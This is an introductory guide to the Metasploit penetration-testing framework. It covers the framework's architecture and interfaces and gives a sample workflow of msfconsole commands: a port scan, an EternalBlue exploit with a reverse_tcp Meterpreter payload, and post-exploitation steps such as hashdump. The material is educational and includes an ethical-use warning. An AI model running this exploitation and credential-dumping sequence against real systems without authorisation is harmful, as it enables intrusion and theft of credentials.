# 🔥 Metasploit Framework – Complete Guide  

---

## 📌 1. What is Metasploit?  
Metasploit is an **open-source penetration testing framework** used for developing, testing, and executing **exploits** against remote targets.  

- Created in **2003** by **H.D. Moore**  
- Acquired by **Rapid7** in 2009  
- Written mainly in **Ruby**, with some components in C and Python  

👉 Think of Metasploit as a **Swiss Army knife** for penetration testers and red teamers.  

---

## 📌 2. Why Metasploit is Important  
- ✅ **Exploit Development** – Build and test custom exploits safely  
- ✅ **Penetration Testing** – Simulate real-world attacks  
- ✅ **Post-Exploitation** – Maintain access, escalate privileges, gather credentials  
- ✅ **Research & Learning** – Safe way to study vulnerabilities  

---

## 📌 3. Metasploit Architecture  

1. **Exploits** – Code that takes advantage of a vulnerability  
   - Example: EternalBlue (MS17-010)  

2. **Payloads** – Code executed on the target after successful exploitation  
   - **Singles** – Standalone (e.g., add a user)  
   - **Stagers** – Small loader that sets up connection  
   - **Stages** – Larger payloads delivered by stagers (e.g., Meterpreter)  

3. **Meterpreter** – Advanced payload that runs in memory  
   - File transfer  
   - Privilege escalation  
   - Keylogging  
   - Pivoting  

4. **Auxiliary Modules** – Non-exploit tools (scanning, fuzzing, DoS, etc.)  
5. **Encoders** – Evade AV/IDS  
6. **NOPS** – Execution stability fillers  

---

## 📌 4. Interfaces  

- **msfconsole** – Main CLI  
- **msfvenom** – Create payloads  
- **Armitage** – GUI (legacy)  
- **Metasploit Pro** – Paid version with reporting & automation  

---

## 📌 5. Common Workflow  

1. **Information Gathering**  
   ```bash
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 192.168.1.100
   run
````

2. **Vulnerability Scanning**

   ```bash
   use auxiliary/scanner/smb/smb_version
   set RHOSTS 192.168.1.100
   run
   ```

3. **Exploitation**

   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.100
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   run
   ```

4. **Post-Exploitation**

   ```bash
   getuid
   sysinfo
   hashdump
   migrate
   ```

---

## 📌 6. Real-World Exploits

* **MS08-067 (Conficker Worm)** – Windows RPC exploit
* **MS17-010 (EternalBlue)** – SMBv1 exploit (WannaCry)
* **Shellshock** – Bash vulnerability
* **BlueKeep (CVE-2019-0708)** – RDP exploit

---

## 📌 7. Advantages

* Open-source and extensible
* Large exploit & payload library
* Integrates with **Nmap**, **Nessus**, **Burp Suite**
* Huge community support

---

## 📌 8. Limitations

* Can be detected by AV/EDR
* Requires frequent updates
* Not all exploits are stable

---

## 📌 9. Ethical Use ⚠️

Metasploit is extremely powerful.

* **Use only on systems you own or have written permission to test**
* Illegal use → serious legal consequences

---

## 📌 10. Learning Resources

* 📖 [Metasploit Documentation](https://docs.metasploit.com)
* 🎯 TryHackMe: Metasploit Rooms
* 🎮 HackTheBox Labs
* 📕 *Metasploit: The Penetration Tester’s Guide*

---

✨ **In short:**
Metasploit is the **industry-standard exploitation framework** that combines reconnaissance, exploitation, payload delivery, and post-exploitation into one tool.

```

